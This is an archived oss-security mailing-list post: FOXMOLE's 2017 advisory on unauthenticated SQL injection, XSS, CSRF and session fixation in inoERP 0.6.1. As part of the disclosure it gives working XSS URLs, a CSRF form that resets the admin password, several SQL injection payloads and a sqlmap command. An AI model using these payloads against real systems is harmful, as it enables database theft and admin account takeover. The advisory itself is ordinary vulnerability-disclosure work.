X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7117" "Monday" "27" "March" "2017" "10:02:10" "+0200" "FOXMOLE Advisories" "advisories@foxmole.com" "<080d168b-239a-4ce0-4eae-507722e8b1ce@foxmole.com>" "177" "[oss-security] inoERP - Multiple Issues" nil nil nil "3" "2017032708:02:10" "[oss-security] inoERP - Multiple Issues" (number mark "U       advisories@f Mar 27  177/7117  " thread-indent "\"[oss-security] inoERP - Multiple Issues\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 18383 invoked by uid 550); 27 Mar 2017 08:29:17 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 29894 invoked from network); 27 Mar 2017 08:02:22 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=foxmole.com; h=
	content-transfer-encoding:content-type:content-type:mime-version
	:date:date:message-id:subject:subject:from:from; s=20161026; t=
	1490601730; x=1492416131; bh=8vQzsmV+HSy5qbv0+DuaOvHLNeKpVj3Jzkl
	/v5Xwolc=; b=MgZewmOOKg3PpIyB/+g2PLc0+kaTJ9rIMmat8nch2oAWbU4bksP
	3C5HV+Rjnr/Uv2K7tTEp3m5zQiRCHnBdAL67zfUb521fPExptMjSSlqpZxpVoIxh
	frh5Cn4dmy+WBLxeXmGln4xo/C173uSzRGSYKYE+7NwWFznYfogkbb5KbD59bPPN
	qfpr91Djlil6CX1AtBSvG1tpASlrY0lwsN8X5ksWsVRe1EGwtUnRPf/j3xjNjmtg
	mvpxeOtRPkVMrxFaYKmfI2XIjQNqJia7E163qyq0O5aBPHSbp8IWCQMCR7QgAoIJ
	Z+AN9lmcK8TXuiKDcZyTdTeIz3TjGa7+o8A==
From: FOXMOLE Advisories <advisories@foxmole.com>
To: oss-security@lists.openwall.com
Message-ID: <080d168b-239a-4ce0-4eae-507722e8b1ce@foxmole.com>
Date: Mon, 27 Mar 2017 10:02:10 +0200
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 7bit
Subject: [oss-security] inoERP - Multiple Issues

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

=== FOXMOLE - Security Advisory 2017-01-25 ===

inoERP  - Multiple Issues
~~~~~~~~~~~~~~~~~~~~~~~~~

Affected Versions
=================
inoERP 0.6.1

Issue Overview
==============
Vulnerability Type: SQL Injection, Cross Site Scripting, Cross Site Request Forgery, Session Fixation
Technical Risk: critical
Likelihood of Exploitation: medium
Vendor: inoERP
Vendor URL: http://inoideas.org/  /  https://github.com/inoerp/inoERP
Credits: FOXMOLE employee Tim Herres
Advisory URL: https://www.foxmole.com/advisories/foxmole-2017-01-25.txt
Advisory Status: Public
OVE-ID: OVE-20170126-0002
CVSS 2.0: 10.0 (AV:N/AC:L/Au:N/C:C/I:C/A:C)


Impact
======
There are multiple SQL Injection vulnerabilities, exploitable without authentication.
An attacker could use the SQL Injection to access the database in an unsafe way.
This means there is a high impact to all applications.
The inoERP software also lacks in input validation resulting in different reflected/stored XSS vulnerabilities.


Issue Description
=================
The following findings are only examples, there are quite more. The whole application should be reviewed.

All items tested using FF52.

1.) Cross Site Scripting:
Stored:
Create a new Question in the -->Forum --> Ask a question
Vulnerable fields : Title, Content
Used Payload: Test<script>alert("xss")</script>

Response:
[...]
 <title>Test<script>alert("xss")</script> - inoERP!</title>
[...]

The latest questions are included in the start page which means the entered payload gets executed directly in the start page.

Reflected:
With Auth:
http://192.168.241.143/inoerp/form.php?class_name=%3CscRipt%3Ealert(%22xss%22)%3C%2fscRipt%3E&mode=9&user_id=7
http://192.168.241.143/inoerp/includes/json/json_blank_search.php?class_name=content&content_type_id=49&window_type=%22%3C/scRipt%3E%3CscRipt%3Ealert(%22xss%22)
%3C/scRipt%3E
http://192.168.241.143/inoerp/program.php?class_name=%3CscRipt%3Ealert(%22xss%22)%3C%2fscRipt%3E&program_name=prg_all_combinations&program_type=download_report

Unauthenticated:
http://192.168.241.143/inoerp/index.php/'%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(%22xss%22)%3C/scRipt%3E

2.) No protection against Cross Site Request Forgery Attacks:
PoC: Changing the admin user credentials.

<html>
<body>
    <form action="http://<IP>/inoerp/form.php?class_name=user" method="POST">
      <input type="hidden" name="headerData&#91;0&#93;&#91;name&#93;" value="user&#95;id&#91;&#93;" />
      <input type="hidden" name="headerData&#91;0&#93;&#91;value&#93;" value="1" />
      <input type="hidden" name="headerData&#91;1&#93;&#91;name&#93;" value="username&#91;&#93;" />
      <input type="hidden" name="headerData&#91;1&#93;&#91;value&#93;" value="inoerp" />
      <input type="hidden" name="headerData&#91;2&#93;&#91;name&#93;" value="enteredPassword&#91;&#93;" />
      <input type="hidden" name="headerData&#91;2&#93;&#91;value&#93;" value="test" />
      <input type="hidden" name="headerData&#91;3&#93;&#91;name&#93;" value="enteredRePassword&#91;&#93;" />
      <input type="hidden" name="headerData&#91;3&#93;&#91;value&#93;" value="test" />
      <input type="hidden" name="headerData&#91;4&#93;&#91;name&#93;" value="first&#95;name&#91;&#93;" />
      <input type="hidden" name="headerData&#91;4&#93;&#91;value&#93;" value="inoerp" />
      <input type="hidden" name="headerData&#91;5&#93;&#91;name&#93;" value="last&#95;name&#91;&#93;" />
      <input type="hidden" name="headerData&#91;5&#93;&#91;value&#93;" value="inoerp" />
      <input type="hidden" name="headerData&#91;6&#93;&#91;name&#93;" value="email&#91;&#93;" />
      <input type="hidden" name="headerData&#91;6&#93;&#91;value&#93;" value="inoerp&#64;no&#45;site&#46;com" />
      <input type="hidden" name="headerData&#91;7&#93;&#91;name&#93;" value="phone&#91;&#93;" />
[..snipped...]

If a privileged user activates the request, the admin user id=1 is set to "test".

3.) SQL Injection:
Auth required:No
#####
http://192.168.241.143/inoerp/form.php?
Parameter: module_code (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or
GROUP BY clause
    Payload: module_code=test' RLIKE (SELECT (CASE WHEN (2838=2838) THEN
0x74657374 ELSE 0x28 END))-- qkmO

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or
GROUP BY clause (FLOOR)
    Payload: module_code=test' AND (SELECT 8706 FROM(SELECT
COUNT(*),CONCAT(0x716b7a6271,(SELECT
(ELT(8706=8706,1))),0x7171626a71,FLOOR(RAND(0)*2))x FROM
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NPEq

    Type: stacked queries
    Title: MySQL > 5.0.11 stacked queries (comment)
    Payload: module_code=test';SELECT SLEEP(5)#

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: module_code=test' OR SLEEP(5)-- STgC

Exploitable using e.g. SQLMAP

Blind SQL Injection:
sqlmap -u
"http://192.168.241.143/inoerp/content.php?content_type%5b%5d=test&search_text=3&search_document_list%5b%5d=all"
 -p "content_type%5b%5d" --dbms="MySQL"
Parameter: content_type[] (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: content_type[]=-8366' OR 7798=7798 AND
'eanR'='eanR&search_text=3&search_document_list[]=all

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: content_type[]=test' OR SLEEP(5) AND
'exIO'='exIO&search_text=3&search_document_list[]=all
#####

4.) Session Fixation:
After a successful login the SessionID PHPSESSID remains the same:
Before Login: INOERP123123=t4e5ef5kqnv6d1u2uguf7lraa2
After Login: INOERP123123=t4e5ef5kqnv6d1u2uguf7lraa2




Temporary Workaround and Fix
============================
FOXMOLE advises to restrict the access to all vulnerable inoERP systems until all vulnerabilities are fixed.



History
=======
2017-01-25  Issue discovered
2017-01-26  Vendor contacted -> no response
2017-02-20  Vendor contacted again -> no response
2017-03-06  Vendor contacted again -> no response
2017-03-27  Advisory Release


GPG Signature
=============
This advisory is signed with the GPG key of the FOXMOLE advisories team.
The key can be downloaded here: https://www.foxmole.com/advisories-key-3812092199E3277C.asc

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEjrQMZqTYqiY2IftqOBIJIZnjJ3wFAljYxwAACgkQOBIJIZnj
J3w40g//aaMIlMKypKA11BkUVDbyza4B3YyhmOnD2HYCX7ALdca5aSu4GwfQp+Lo
xS5ZmQOY9IlEBmw7xNlIeK6wHQd2mpOkIv6kzGcBQo5YzRqGN6PIK4XJk/Z7XRUc
cmObGqmkRSZ7lNDE01EuOkgtRgouSNTbh7qTLh6zwwmfEwyIWsMS5lNq2Reongy7
QXTt6mlXBttszrvaiELWcKtmVEHRQHHo7Zi8RAec9vt74ANAu9PzpAQnIpkQOQNR
8rusJkMBn4uFhcLsUxH53UlMg+DCCbfg1Kc7Gly0kYdoirDKuq544nng7pDvfDYg
e6daWhm7ReL1XEjj3TU/7q1XMfCh/qyiEWeHZGsG/JReA7Rj//DkMTsR6FvTc4Ns
ZXj1X/zzMdrPGKpki57/0z+/LupySTgDmKtM+q2UFLXSz9dF0YRIUn0uSJ7AH8bu
xmF8KvIycUSWTPFchsnWO4fL7+d8Z56qqN7RmuF4v/MobHXKOner/4j+z4wxPowt
wLRNEYnF4gSmaS+LYPmv//vHoyXoJRJBkXqGYFwtGEud+WqUpT35UxBaHbzjCAjM
yziFzW7XLYkP15i5UP7sdf44eiHdF6D4BZqFHCc1oZkK/NWHtrXRSLBimHkSGYlr
PNU7T+KRiu9G5hoIbQCja9L1EkIzDg87ZLqsDMvLXYOEmrFrOKs=
=h4Qx
-----END PGP SIGNATURE-----
